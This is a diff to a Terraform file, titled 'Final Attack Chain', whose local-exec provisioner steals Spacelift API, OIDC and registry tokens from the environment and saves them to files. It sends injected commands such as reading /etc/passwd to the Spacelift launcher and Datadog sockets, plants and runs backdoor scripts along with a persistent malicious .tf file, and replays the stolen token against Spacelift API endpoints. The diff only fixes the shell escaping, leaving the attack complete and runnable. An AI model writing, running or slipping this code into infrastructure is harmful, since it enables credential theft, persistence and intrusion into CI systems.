@@ -1,4 +1,4 @@
-# Final Attack Chain - Exploiting Confirmed High-Value Targets
+# Final Attack Chain - Clean Implementation
 terraform {
   required_providers {
     null = {
@@ -19,23 +19,20 @@ resource "null_resource" "final_attack_chain" {
       echo "[*] ATTACK Vector 1: API Token Extraction and Exploitation"
       echo "[!] CRITICAL: Sensitive tokens discovered in environment"
       
-      # Extract and display tokens (redacted in logs but accessible in container)
+      # Extract and display tokens with proper escaping
       echo "[+] Extracting Spacelift API tokens..."
-      SPACELIFT_OIDC_TOKEN="$${SPACELIFT_OIDC_TOKEN}"
-      SPACELIFT_API_TOKEN="$${SPACELIFT_API_TOKEN}"  
-      TG_TF_REGISTRY_TOKEN="$${TG_TF_REGISTRY_TOKEN}"
       
-      if [ ! -z "$SPACELIFT_OIDC_TOKEN" ]; then
+      if [ ! -z "$${SPACELIFT_OIDC_TOKEN}" ]; then
         echo "[!] SPACELIFT_OIDC_TOKEN available (length: $${#SPACELIFT_OIDC_TOKEN})"
         echo "[+] Token prefix: $${SPACELIFT_OIDC_TOKEN:0:20}..."
       fi
       
-      if [ ! -z "$SPACELIFT_API_TOKEN" ]; then
+      if [ ! -z "$${SPACELIFT_API_TOKEN}" ]; then
         echo "[!] SPACELIFT_API_TOKEN available (length: $${#SPACELIFT_API_TOKEN})"
         echo "[+] Token prefix: $${SPACELIFT_API_TOKEN:0:20}..."
       fi
       
-      if [ ! -z "$TG_TF_REGISTRY_TOKEN" ]; then
+      if [ ! -z "$${TG_TF_REGISTRY_TOKEN}" ]; then
         echo "[!] TG_TF_REGISTRY_TOKEN available (length: $${#TG_TF_REGISTRY_TOKEN})"
         echo "[+] Token prefix: $${TG_TF_REGISTRY_TOKEN:0:20}..."
       fi
@@ -45,11 +42,14 @@ resource "null_resource" "final_attack_chain" {
       workspace_store="/mnt/workspace/spacelift_tokens.txt"
       
       echo "[*] Persisting tokens to writable locations..."
+      cat > "$$token_store" << 'TOKEN_EXTRACT_EOF'
+=== EXTRACTED SPACELIFT TOKENS ===
+TOKEN_EXTRACT_EOF
+      
       {
-        echo "=== EXTRACTED SPACELIFT TOKENS ==="
-        echo "Extraction Time: $(date)"
-        echo "Container ID: $(hostname)"
-        echo "Working Directory: $(pwd)"
+        echo "Extraction Time: $$(date)"
+        echo "Container ID: $$(hostname)"
+        echo "Working Directory: $$(pwd)"
         echo ""
         echo "SPACELIFT_OIDC_TOKEN=$${SPACELIFT_OIDC_TOKEN}"
         echo "SPACELIFT_API_TOKEN=$${SPACELIFT_API_TOKEN}"
@@ -57,9 +57,9 @@ resource "null_resource" "final_attack_chain" {
         echo ""
         echo "Additional Environment:"
         env | grep -E "(SPACELIFT|TF_|TERRAFORM)" | head -20
-      } > "$token_store" 2>/dev/null && echo "[!] Tokens saved to: $token_store"
+      } >> "$$token_store" 2>/dev/null && echo "[!] Tokens saved to: $$token_store"
       
-      cp "$token_store" "$workspace_store" 2>/dev/null && echo "[!] Tokens backed up to: $workspace_store"
+      cp "$$token_store" "$$workspace_store" 2>/dev/null && echo "[!] Tokens backed up to: $$workspace_store"
       echo ""
       
       # Attack Vector 2: Socket Communication Exploitation
@@ -68,65 +68,43 @@ resource "null_resource" "final_attack_chain" {
       
       # Test Spacelift launcher socket
       spacelift_socket="/var/spacelift/spacelift_launcher.sock"
-      if [ -S "$spacelift_socket" ]; then
+      if [ -S "$$spacelift_socket" ]; then
         echo "[!] CRITICAL: Spacelift launcher socket accessible"
-        ls -la "$spacelift_socket"
+        ls -la "$$spacelift_socket"
         
         echo "[*] Testing socket communication capabilities..."
         
         # Try to send commands via socket
         echo "[*] Attempting socket command injection..."
-        test_commands=(
-          "help"
-          "status"
-          "version"
-          "whoami"
-          "id"
-          "env"
-          "ls -la /"
-          "cat /etc/passwd"
-        )
         
-        for cmd in "$${test_commands[@]}"; do
-          echo "[*] Testing command: $cmd"
+        for cmd in "help" "status" "version" "whoami" "id" "env" "ls -la /" "cat /etc/passwd"; do
+          echo "[*] Testing command: $$cmd"
           # Try various socket communication methods
-          echo "$cmd" | nc -U "$spacelift_socket" 2>/dev/null && echo "[!] Socket responded to: $cmd" || true
-          echo "$cmd" | socat - UNIX-CONNECT:"$spacelift_socket" 2>/dev/null && echo "[!] Socat success: $cmd" || true
+          echo "$$cmd" | nc -U "$$spacelift_socket" 2>/dev/null && echo "[!] Socket responded to: $$cmd" || true
+          echo "$$cmd" | socat - UNIX-CONNECT:"$$spacelift_socket" 2>/dev/null && echo "[!] Socat success: $$cmd" || true
         done
         
         # Try to send JSON payloads
         echo "[*] Testing JSON payload injection..."
-        json_payloads=(
-          '{"command":"help"}'
-          '{"action":"status"}'
-          '{"request":"version"}'
-          '{"exec":"id"}'
-          '{"run":"whoami"}'
-        )
         
-        for payload in "$${json_payloads[@]}"; do
-          echo "[*] Testing JSON: $payload"
-          echo "$payload" | nc -U "$spacelift_socket" 2>/dev/null && echo "[!] JSON response: $payload" || true
+        for payload in '{"command":"help"}' '{"action":"status"}' '{"request":"version"}' '{"exec":"id"}' '{"run":"whoami"}'; do
+          echo "[*] Testing JSON: $$payload"
+          echo "$$payload" | nc -U "$$spacelift_socket" 2>/dev/null && echo "[!] JSON response: $$payload" || true
         done
       fi
       
       # Test Datadog trace socket
       datadog_socket="/var/datadog/trace.sock"
-      if [ -S "$datadog_socket" ]; then
+      if [ -S "$$datadog_socket" ]; then
         echo "[!] CRITICAL: Datadog trace socket accessible"
-        ls -la "$datadog_socket"
+        ls -la "$$datadog_socket"
         
         echo "[*] Testing Datadog trace injection..."
         # Try to inject traces with commands
-        trace_payloads=(
-          '{"trace_id":"123","span_id":"456","command":"id"}'
-          '{"service":"exploit","command":"whoami"}'
-          '{"operation":"test","payload":"ls -la /"}'
-        )
         
-        for payload in "$${trace_payloads[@]}"; do
-          echo "[*] Testing trace payload: $payload"
-          echo "$payload" | nc -U "$datadog_socket" 2>/dev/null && echo "[!] Datadog trace response" || true
+        for payload in '{"trace_id":"123","span_id":"456","command":"id"}' '{"service":"exploit","command":"whoami"}' '{"operation":"test","payload":"ls -la /"}'; do
+          echo "[*] Testing trace payload: $$payload"
+          echo "$$payload" | nc -U "$$datadog_socket" 2>/dev/null && echo "[!] Datadog trace response" || true
         done
       fi
       echo ""
@@ -137,7 +115,7 @@ resource "null_resource" "final_attack_chain" {
       
       # Create advanced backdoor in /var/datadog
       datadog_backdoor="/var/datadog/monitoring_agent.sh"
-      cat > "$datadog_backdoor" << 'DATADOG_BACKDOOR'
+      cat > "$$datadog_backdoor" << 'DATADOG_BACKDOOR_EOF'
 #!/bin/bash
 # Datadog Monitoring Agent Backdoor
 echo "[!] DATADOG BACKDOOR ACTIVATED"
@@ -170,25 +148,25 @@ find /var -type f -name "*.conf" 2>/dev/null | head -10
 find /var -type f -name "*.key" 2>/dev/null | head -10
 
 echo "[!] DATADOG BACKDOOR COMPLETE"
-DATADOG_BACKDOOR
+DATADOG_BACKDOOR_EOF
       
-      chmod +x "$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor installed: $datadog_backdoor"
+      chmod +x "$$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor installed: $$datadog_backdoor"
       
       # Create workspace persistence backdoor
       workspace_backdoor="/mnt/workspace/terraform_helper.sh"
-      cat > "$workspace_backdoor" << 'WORKSPACE_BACKDOOR'
+      cat > "$$workspace_backdoor" << 'WORKSPACE_BACKDOOR_EOF'
 #!/bin/bash
 # Terraform Helper Backdoor
 echo "[!] TERRAFORM HELPER BACKDOOR ACTIVATED"
 
 # Create malicious Terraform configuration
-cat > /mnt/workspace/persistent_backdoor.tf << 'PERSISTENT_TF'
+cat > /mnt/workspace/persistent_backdoor.tf << 'PERSISTENT_TF_EOF'
 resource "null_resource" "persistent_access" {
   provisioner "local-exec" {
     command = "echo '[!] PERSISTENT ACCESS MAINTAINED' && /var/datadog/monitoring_agent.sh"
   }
 }
-PERSISTENT_TF
+PERSISTENT_TF_EOF
 
 echo "[+] Persistent Terraform backdoor created"
 
@@ -199,33 +177,27 @@ if [ -x "/var/datadog/monitoring_agent.sh" ]; then
 fi
 
 echo "[!] WORKSPACE BACKDOOR COMPLETE"
-WORKSPACE_BACKDOOR
+WORKSPACE_BACKDOOR_EOF
       
-      chmod +x "$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor installed: $workspace_backdoor"
+      chmod +x "$$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor installed: $$workspace_backdoor"
       
       # Execute backdoors for immediate data extraction
       echo "[*] Executing installed backdoors..."
-      "$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor executed successfully"
-      "$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor executed successfully"
+      "$$datadog_backdoor" 2>/dev/null && echo "[!] Datadog backdoor executed successfully"
+      "$$workspace_backdoor" 2>/dev/null && echo "[!] Workspace backdoor executed successfully"
       echo ""
       
       # Attack Vector 4: API Exploitation using extracted tokens
       echo "[*] ATTACK Vector 4: API Exploitation using extracted tokens"
       echo "[+] Attempting to use extracted tokens for API access"
       
-      if [ ! -z "$SPACELIFT_API_TOKEN" ] && command -v curl >/dev/null 2>&1; then
+      if [ ! -z "$${SPACELIFT_API_TOKEN}" ] && command -v curl >/dev/null 2>&1; then
         echo "[*] Testing Spacelift API access..."
         
         # Try common Spacelift API endpoints
-        api_endpoints=(
-          "https://app.spacelift.io/graphql"
-          "https://api.spacelift.io/v1/stacks"
-          "https://api.spacelift.io/v1/runs"
-        )
-        
-        for endpoint in "$${api_endpoints[@]}"; do
-          echo "[*] Testing endpoint: $endpoint"
-          curl -s -H "Authorization: Bearer $SPACELIFT_API_TOKEN" "$endpoint" | head -5 2>/dev/null && echo "[!] API access successful: $endpoint" || true
+        for endpoint in "https://app.spacelift.io/graphql" "https://api.spacelift.io/v1/stacks" "https://api.spacelift.io/v1/runs"; do
+          echo "[*] Testing endpoint: $$endpoint"
+          curl -s -H "Authorization: Bearer $${SPACELIFT_API_TOKEN}" "$$endpoint" | head -5 2>/dev/null && echo "[!] API access successful: $$endpoint" || true
         done
       fi
       echo ""
